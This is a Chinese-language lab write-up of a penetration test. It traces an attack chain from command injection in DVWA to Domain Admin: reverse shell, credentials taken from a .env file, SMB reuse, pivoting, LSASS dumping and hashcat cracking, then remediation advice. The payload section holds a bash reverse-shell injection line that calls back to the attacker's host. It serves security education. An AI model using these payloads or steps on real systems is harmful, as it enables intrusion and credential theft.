# Overview

本實驗展示一條從Web應用程式到Active Directory環境的完整攻擊鏈。

攻擊起點為部署於Ubuntu主機上的DVWA（192.168.203.130），攻擊者透過Command Injection取得初始存取權，進一步建立Reverse Shell並取得系統內憑證資訊，
隨後利用取得的帳號密碼進行SMB驗證，成功登入具備雙網卡之Windows工作站，並透過該主機進行內網橫向移動（Pivoting）。
在進入內網後，針對Domain Controller進行服務識別與憑證提取，透過LSASS記憶體取得帳密並進行離線破解，最終取得Domain Admin權限。
此攻擊鏈展示了憑證重用與網路分段不當所帶來的高風險影響。

# Lab Environment

本實驗環境建置於VMware Workstation之虛擬化環境中，模擬一個簡化的企業網路架構。

整體環境包含以下主機：

- Kali Linux（攻擊端）
- Ubuntu（部署DVWA，作為初始目標）
- Windows 10（雙網卡工作站，作為Pivot節點）
- Windows Server 2022（Domain Controller）

網路設計分為外網與內網兩個區段：

- 外網：192.168.203.0/24
- 內網：192.168.88.0/24

Ubuntu主機僅連接外網，無法直接存取內網資源，但可透過DNS解析Domain Controller。
Windows 10工作站同時連接外網與內網，形成雙網卡（Dual-homed）架構，作為內外網之間的橋接點。
此設計用於模擬攻擊者從外部Web服務入侵後，透過憑證重用與橫向移動，逐步滲透至內網並最終控制Domain Controller的情境。

# Attack Chain

以下為本實驗之攻擊流程圖：

<p align="center">
  <img src="../evidence/core/attack-path.png" alt="Attack Diagram">
</p>

本攻擊由外部攻擊者（Kali）開始，首先針對部署於Ubuntu上的DVWA進行Command Injection攻擊，取得系統執行權限，並建立Reverse Shell以取得初始存取權。
在取得系統存取後，攻擊者從目標主機中取得憑證資訊（.env），並利用憑證重用進行SMB驗證，成功登入具備雙網卡的Windows工作站。
該工作站同時連接外網與內網，作為Pivot節點，使攻擊者得以進入內網環境。
進入內網後，攻擊者針對Domain Controller進行服務識別與後續攻擊，透過LSASS記憶體提取憑證並進行離線破解，最終取得Domain Admin權限。

# Initial Access

## 說明

攻擊者針對DVWA應用程式進行Command Injection攻擊，成功取得系統執行權限。

## 方法

透過注入命令分隔符號（如 `;`），使後端直接執行系統指令，進而確認漏洞存在。
隨後建立Reverse Shell，取得遠端主機控制權。

## 修改建議

進行使用者輸入驗證或輸入字元白名單驗證。

## 範例Payload

```bash
127.0.0.1; whoami
127.0.0.1; bash -i >& /dev/tcp/192.168.203.131/4444 0>&1
```

## 證據

Request + Response:

<p align="center">
  <img src="../evidence/core/command-injection-request-response.png" alt="Request+Response">
</p>

- 成功建立連線

Reverse Shell:

<p align="center">
  <img src="../evidence/core/reverse-shell.png" alt="Reverse Shell">
</p>

- 可執行 whoami 等指令

## 結果

成功取得目標主機之Shell存取權，作為後續攻擊的起點。

# Credential Access

## 說明

在取得Web主機存取權後，攻擊者透過系統指令檢視網站目錄內容，發現敏感設定檔（.env）與備份檔案。

## 方法

利用已取得的Shell存取權，讀取 `/var/www/html/.env` 及備份目錄內容，
從中取得資料庫帳號與密碼資訊。

## 證據

<p align="center">
  <img src="../evidence/core/exposed-env-file.png" alt="檔案內容">
</p>

可觀察到：

- DB_USER=lab\svc-sql
- DB_PASS=P@ssw0rd123!

此外，於備份檔案中亦出現相同帳號資訊（svc-sql），顯示該帳號可能被重複使用。

## 結果

成功取得有效帳號（svc-sql）與密碼，並確認存在憑證重用（Credential Reuse），
可用於後續SMB登入與橫向移動。

# Lateral Movement

## 說明

攻擊者利用在Web主機中取得的帳號密碼（svc-sql），嘗試登入其他系統，
以進行橫向移動（Lateral Movement）。

## 方法

使用 crackmapexec 工具對外網Windows主機（192.168.203.132）進行SMB驗證，
測試該帳號是否可用於其他系統。

## 證據

<p align="center">
  <img src="../evidence/core/win10-smb-pwned.png" alt="Win10 Pwn3d">
</p>

可觀察到：

- 成功登入目標主機
- 顯示 `(Pwn3d!)`，代表該帳號具備足夠權限

## 結果

成功登入Windows工作站，確認憑證有效，
並取得一個可作為後續攻擊之Pivot節點。

# Internal Pivot

## 說明

攻擊者利用已控制的Windows工作站作為跳板，進入內網環境。

## 方法

透過 crackmapexec 執行遠端指令（ipconfig），確認網路介面配置。

## 證據

<p align="center">
  <img src="../evidence/core/win10-ipconfig.png" alt="Win10 ipconfig">
</p>

可觀察到：

- 外網 IP：192.168.203.132
- 內網 IP：192.168.88.110

顯示該主機為雙網卡（Dual-homed），具備內外網存取能力。

此外，透過 ping 測試：

<p align="center">
  <img src="../evidence/core/win10-ping-dc.png" alt="Win10 ping DC">
</p>

可成功連線至 Domain Controller（192.168.88.100）

## 結果

成功確認可透過Windows主機進入內網，並與Domain Controller通訊。

# Credential Dumping

## 說明

在取得Windows主機控制權後，攻擊者嘗試提取記憶體中的帳密資訊。

## 方法

使用 crackmapexec 的 `--lsa` 功能，從LSASS（Local Security Authority Subsystem Service）中擷取憑證。

## 證據

<p align="center">
  <img src="../evidence/core/lsass-dump.png" alt="LSASS">
</p>

可觀察到：

- 多個使用者的NTLM雜湊
- 包含 Administrator 與其他帳號

## 結果

成功取得多組帳號雜湊，可用於後續破解或直接利用。

# Privilege Escalation

## 說明

攻擊者利用取得的雜湊進行離線破解，取得明文密碼。

## 方法

使用 hashcat 對NTLM雜湊進行破解。

## 證據

<p align="center">
  <img src="../evidence/core/hashcat-cracking.png" alt="hashcat">
</p>

成功取得：

- Administrator 密碼：NewPassword123

接著進行驗證：

<p align="center">
  <img src="../evidence/core/dc-smb-pwned.png" alt="DC admin">
</p>

可觀察到：

- 成功登入 Domain Controller
- 顯示 `(Pwn3d!)`
- whoami 為 `lab\administrator`

## 結果

成功取得Domain Admin權限，完全控制Active Directory環境。

# Impact

本攻擊鏈展示從Web應用程式到Active Directory完全控制的風險。
攻擊者可透過初始漏洞取得系統存取權，進而取得敏感憑證，並利用憑證重用進行橫向移動。
最終取得Domain Admin權限後，攻擊者可：

- 存取所有網域內系統與資料
- 建立後門帳號以維持長期存取（Persistence）
- 修改或刪除重要資料（Integrity Impact）
- 存取機密資訊（Confidentiality Impact）
- 影響服務運作（Availability Impact）

此情境代表整個企業網路已完全被攻陷（Full Domain Compromise）。

# Remediation

為降低此類攻擊風險，建議採取以下措施：

1. 輸入驗證（Input Validation）
   - 所有使用者輸入應進行過濾與驗證
   - 避免直接將輸入傳遞至系統命令

2. 敏感資訊保護
   - 避免將帳號密碼儲存在可公開存取的檔案（如 .env）
   - 限制設定檔存取權限

3. 憑證管理（Credential Management）
   - 避免帳號密碼重用
   - 使用不同服務專用帳號

4. 權限控管（Least Privilege）
   - 限制服務帳號權限
   - 避免使用高權限帳號執行服務

5. 網路分段（Network Segmentation）
   - Web伺服器不應直接接觸內網
   - 禁止雙網卡主機作為橋接點

6. 監控與防禦（Monitoring）
   - 部署EDR / SIEM
   - 偵測異常登入與橫向移動行為
